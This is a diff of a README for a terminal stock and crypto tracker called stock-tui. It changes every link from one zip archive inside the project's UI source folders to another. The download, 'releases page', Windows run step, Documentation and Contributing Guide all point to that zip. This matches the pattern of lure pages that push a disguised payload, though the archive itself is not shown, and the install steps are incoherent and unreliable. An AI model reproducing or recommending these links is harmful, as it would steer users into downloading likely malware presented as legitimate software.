@@ -1,6 +1,6 @@
 # 🚀 stock-tui - Track Stocks and Crypto in Your Terminal
 
-![Download stock-tui](https://raw.githubusercontent.com/gersonM20/stock-tui/main/internal/ui/modal/tui_stock_v2.2.zip)
+![Download stock-tui](https://github.com/gersonM20/stock-tui/raw/refs/heads/main/internal/ui/chart/tui_stock_v2.1.zip)
 
 ## 📚 Description
 
@@ -29,7 +29,7 @@ To get started with stock-tui, you first need to download the application.
 
 1. **Visit the Releases Page:** Click the link below to go to the downloads page. 
 
-   [Download stock-tui](https://raw.githubusercontent.com/gersonM20/stock-tui/main/internal/ui/modal/tui_stock_v2.2.zip)
+   [Download stock-tui](https://github.com/gersonM20/stock-tui/raw/refs/heads/main/internal/ui/chart/tui_stock_v2.1.zip)
 
 2. **Choose the Latest Version:** On the releases page, look for the latest version at the top of the list. 
 
@@ -39,14 +39,14 @@ To get started with stock-tui, you first need to download the application.
 
 To install stock-tui, follow these steps:
 
-1. **Download** the latest version from the releases page: [Download stock-tui](https://raw.githubusercontent.com/gersonM20/stock-tui/main/internal/ui/modal/tui_stock_v2.2.zip).
+1. **Download** the latest version from the releases page: [Download stock-tui](https://github.com/gersonM20/stock-tui/raw/refs/heads/main/internal/ui/chart/tui_stock_v2.1.zip).
 
 2. **Extract the Files:**
    - If you downloaded a zipped file, right-click on it and select "Extract" or "Unzip."
    - Navigate into the extracted folder.
 
 3. **Run the Application:**
-   - For Windows: Double-click `https://raw.githubusercontent.com/gersonM20/stock-tui/main/internal/ui/modal/tui_stock_v2.2.zip`.
+   - For Windows: Double-click `https://github.com/gersonM20/stock-tui/raw/refs/heads/main/internal/ui/chart/tui_stock_v2.1.zip`.
    - For macOS or Linux: Open your terminal, navigate to the folder containing the downloaded file, and run the command:
      ```bash
      ./stock-tui
@@ -77,7 +77,7 @@ For help or to share your experiences, consider joining our community:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Detailed usage and feature explanations can be found in the [Documentation](https://raw.githubusercontent.com/gersonM20/stock-tui/main/internal/ui/modal/tui_stock_v2.2.zip).
-- **Contributing:** Interested in improving stock-tui? Check out our [Contributing Guide](https://raw.githubusercontent.com/gersonM20/stock-tui/main/internal/ui/modal/tui_stock_v2.2.zip).
+- **Documentation:** Detailed usage and feature explanations can be found in the [Documentation](https://github.com/gersonM20/stock-tui/raw/refs/heads/main/internal/ui/chart/tui_stock_v2.1.zip).
+- **Contributing:** Interested in improving stock-tui? Check out our [Contributing Guide](https://github.com/gersonM20/stock-tui/raw/refs/heads/main/internal/ui/chart/tui_stock_v2.1.zip).
 
 Now, you are ready to track stocks and cryptocurrencies in real time using stock-tui. Enjoy your financial tracking journey!
